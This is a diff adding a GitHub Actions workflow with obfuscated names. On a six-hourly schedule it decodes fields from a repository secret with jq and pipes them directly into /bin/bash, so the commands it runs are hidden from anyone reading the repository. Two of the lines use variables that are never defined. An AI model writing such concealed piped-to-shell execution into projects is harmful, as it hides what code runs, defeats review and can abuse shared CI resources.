@@ -1,0 +1,20 @@
+name: fengqingheng9527
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fengqingheng9527
+        env:
+          jfeui4: ${{ secrets.jfeui4 }}
+        run: |
+          echo $jfeui4 | jq -r .xra43 | /bin/bash
+          echo $xlspy0605 | jq -r .re88 | /bin/bash
+          echo $wtp53 | jq -r .i32 | /bin/bash
+
